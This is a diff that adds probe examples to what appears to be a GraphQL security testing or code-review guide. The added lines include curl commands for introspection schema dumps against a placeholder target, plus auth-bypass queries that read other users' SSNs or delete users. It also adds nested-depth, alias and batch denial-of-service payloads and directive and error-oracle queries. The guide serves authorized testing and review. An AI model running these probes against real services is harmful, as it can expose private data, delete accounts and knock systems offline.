@@ -82,6 +82,39 @@ id } secretField { token
 
 **Expected signal**: unauthorized fields in JSON response or errors referencing unexpected field nodes.
 
+**Introspection enabled**
+```bash
+curl -s -X POST https://target/graphql -H 'Content-Type: application/json' \
+  -d '{"query":"{ __schema { types { name fields { name type { name } } } mutationType { fields { name args { name type { name } } } } queryType { fields { name } } } }"}'
+```
+**Expected signal**: full schema dump (`types`, `mutationType`, hidden admin fields).
+
+**Auth bypass probes (static document — test resolver authorization)**
+```graphql
+{ adminUsers { id email role } }
+mutation { deleteUser(id: "123") { success } }
+{ user(id: "OTHER_USER_ID") { email ssn } }
+```
+
+**Depth / alias / batch DoS (when no complexity limits)**
+```graphql
+{ users { posts { comments { author { posts { comments { author { id } } } } } } } } }
+{ a1: __typename a2: __typename a3: __typename }
+```
+```bash
+# Batch array body — rate-limit bypass probe
+curl -X POST https://target/graphql -H 'Content-Type: application/json' \
+  -d '[{"query":"{ __typename }"},{"query":"{ __typename }"}]'
+```
+**Expected signal**: timeout, 500, or linear cost growth vs. alias/batch count.
+
+**Directive / error oracle**
+```graphql
+{ user(id: "1") { name email @skip(if: false) secretField @include(if: true) } }
+{ user { nonExistentField } }
+```
+**Expected signal**: leaked fields via directives, or validation errors suggesting hidden field names.
+
 ## TRUE POSITIVE Criteria
 
 - User-controlled data reaches string assembly of a GraphQL operation document (concat, template literal, format) before `execute` or downstream HTTP forward.
